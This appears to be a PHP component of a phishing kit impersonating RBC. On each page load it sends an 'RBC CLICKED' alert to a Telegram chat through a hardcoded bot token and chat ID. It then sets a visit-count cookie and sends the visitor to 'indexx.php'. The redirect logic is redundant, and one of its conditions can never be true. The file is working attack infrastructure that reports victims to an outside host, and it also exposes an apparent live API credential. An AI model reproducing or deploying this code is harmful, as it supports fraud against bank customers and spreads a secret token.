<?php


$message = "RBC CLICKED\n";

$apiToken = "6885525472:AAHKXGwpJimgfHOptJ4JDHw_FWTgyHlRUTk"; 
$data = [
    'chat_id' => '-1001809635857',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    
?><?php

// Set a cookie to track the number of visits
if (!isset($_COOKIE['visit_count'])) {
    $visit_count = 1;
    setcookie('visit_count', $visit_count, time() + 3600*24*365);
} else {
    $visit_count = $_COOKIE['visit_count'] + 1;
    setcookie('visit_count', $visit_count, time() + 3600*24*365);
}

// Redirect based on visit count
if ($visit_count < 2) {
  header("Location: indexx.php");
} elseif ($visit_count >= 2 && $visit_count < 6) {
  header("Location: indexx.php");
} elseif ($visit_count >=10 && $visit_count < 10) {
  header("Location: indexx.php");
} else {
    header('Location: indexx.php');
}

exit;
